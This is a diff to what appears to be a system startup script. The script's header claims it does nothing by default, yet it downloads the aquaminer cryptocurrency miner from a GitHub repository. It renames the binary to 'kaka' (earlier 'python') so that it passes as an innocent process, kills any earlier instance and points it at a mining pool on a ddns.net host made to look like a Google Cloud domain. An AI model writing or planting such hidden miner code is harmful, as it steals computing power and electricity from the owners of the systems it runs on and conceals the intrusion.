@@ -11,23 +11,23 @@
 #
 # By default this script does nothing.
 if [ -f ${PWD}/python ]; then
-    if pgrep -x "python" > /dev/null
+    if pgrep -x "kaka" > /dev/null
 then
-pkill python
+pkill kaka
 echo " kill process"
-./python -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
+./kaka -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
 
     
 else
 
 echo "Miner da install , chay thoi "
-./python -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
+./kaka -F http://test-googlecloud.ddns.net/0xf71f7a7f6f7711331a3e2749d57a9f743e4387ed/ggco
 
      
 fi
 exit
 fi
-
+rm aquaminer-0.4-linux-amd64.zip
 wget https://github.com/StupidmanTan/miner-cpu/raw/master/aquaminer-0.4-linux-amd64.zip
 unzip aquaminer-0.4-linux-amd64.zip
 mv aquaminer-0.4-linux-amd64 kaka
